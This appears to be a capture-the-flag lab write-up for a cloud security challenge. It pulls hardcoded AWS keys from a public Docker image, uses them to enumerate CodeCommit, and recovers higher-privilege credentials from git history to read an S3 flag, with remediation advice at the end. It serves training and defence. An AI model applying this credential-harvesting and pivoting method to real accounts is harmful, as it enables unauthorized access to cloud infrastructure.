https://pwnedlabs.io/labs/uncover-secrets-in-codecommit-and-docker

---
## Vulnerability Summary
The environment is vulnerable to **Supply Chain Compromise** and **Information Disclosure** due to the inclusion of sensitive credentials in container images and version control system (CodeCommit) history.

1. **Insecure Container Distribution**: A Docker image (`huge-logistics-terraform-runner`) was published to a public registry containing hardcoded AWS IAM credentials within its environment variables.
2. **Exposure via Image Inspection**: Because the secrets were bundled directly into the container's environment, they were trivially discoverable using `docker inspect` or by running the container and checking the `env` output.
3. **Privilege Escalation via CodeCommit**: The leaked credentials granted access to `AWS CodeCommit`, where an attacker used Git history analysis (`get-differences`) to discover additional, more privileged credentials stored in older versions of `js/server.js`.
4. **Impact**: The high-privilege `code-admin` credentials facilitated unauthorized access to sensitive S3 buckets containing corporate flags, demonstrating how credential leakage in the CI/CD pipeline propagates to production infrastructure.

---
## Walkthrough
Searching on Docker Hub for images related to Huge Logistics, we find `huge-logistics-terraform-runner` Running version `0.12`. Can also enumerate with `docker`:

```bash
docker search huge-logistics
curl https://hub.docker.com/v2/repositories/hljose/huge-logistics-terraform-runner/tags | jq
docker pull hljose/huge-logistics-terraform-runner:0.12
```

Next we can install the Docker Scout plugin. This provides a convenient way for us to get more information from the image, including the distribution and approximate patching level based on the presence of vulnerabilities.

```bash
curl -fsSL https://raw.githubusercontent.com/docker/scout-cli/main/install.sh -o install-scout.sh
sh install-scout.sh
docker scout quickview
```

Scanning the image for vulnerable software returns an OpenSSL vulnerability:

```bash
docker scout cves hljose/huge-logistics-terraform-runner:0.12
```

Run the container and find keys in the environment variable and enumerating `/usr/local/bin` reveals a URL in `health-check.sh` :

```bash
docker run -i -t hljose/huge-logistics-terraform-runner:0.12 /bin/bash
env
	Keys
ls -al /usr/local/bin
	health-check.sh
```

We could also have used `docker inspect` to find the environment variables:

```bash
docker inspect hljose/huge-logistics-terraform-runner:0.12
```

Use aws configure to authenticate:

```bash
aws configure --profile docker
aws sts get-caller-identity --profile docker
```

Enumerate the new IAM user `prod-deploy` to identify the services.

```bash
aws-enumerator cred -aws_access_key_id <ACCESS_KEY> -aws_secret_access_key <SECRET_KEY> -aws_region us-east-1
aws-enumerator dump -services CODECOMMIT
	ListRepositories
```

The `prod-deploy` user can list repositories using the CodeCommit service. We can see the `vessel-tracking` repository, get it and inspect the branches:

```bash
aws codecommit list-repositories --profile docker
	vessel-tracking
aws codecommit get-repository --repository-name vessel-tracking --profile docker
aws codecommit list-branches --repository-name vessel-tracking --profile docker
	master
	dev
```

Inspect each branch and whatever commits they have:

```bash
aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --profile docker
	b63f0756ce162a3928c4470681cf18dd2e4e2d5a
aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile docker
	parent commit: 2272b1b6860912aa3b042caf9ee3aaef58b19cb1
```

Run `get-differences` to find files changed between commits:

```bash
aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile docker
	js/server.js
```

Get this `server.js` file: 

```
aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js --profile docker
	fileContent: <BASE64_Encoded>
```

Decoding the Base64 `fileContent` reveals the bucket `vessel-tracking` and another set of AWS creds. Configure and use them:

```bash
aws configure --profile codecommit
aws sts get-caller-identity --profile codecommit
	code-admin
```

We can now use these creds as `code-admin`, enumerate the bucket `vessel-tracking`:

```bash
aws s3 ls vessel-tracking --profile codecommit
aws s3 cp s3://vessel-tracking/flag.txt . --profile codecommit
```

---
## Remediations
1. **Secure Container Images**:
   - **Never include secrets** (keys, passwords, tokens) in Docker images or environment variables. Use `AWS Secrets Manager` or `Parameter Store` to inject configuration at runtime.
   - Use multi-stage builds to remove sensitive build-time artifacts and tools before creating the final production image.

2. **Clean Code Histories**:
   - Perform periodic scans of `CodeCommit` and other Git repositories for hardcoded credentials. 
   - If secrets are accidentally pushed, consider the credentials compromised, rotate them immediately, and use tools like `git-filter-repo` to permanently remove the history.

3. **CI/CD Security**:
   - Use **IAM Roles** for tasks and runners rather than static access keys. 
   - Implement automated vulnerability scanning for container images using `Docker Scout` or `Amazon ECR Image Scanning` to identify and patch vulnerable dependencies like `OpenSSL`.

4. **Access Control**:
   - Enforce the **Principle of Least Privilege (PoLP)** on CodeCommit repositories; ensure that only authorized service principals have `codecommit:GetFile` or `codecommit:GetCommit` permissions.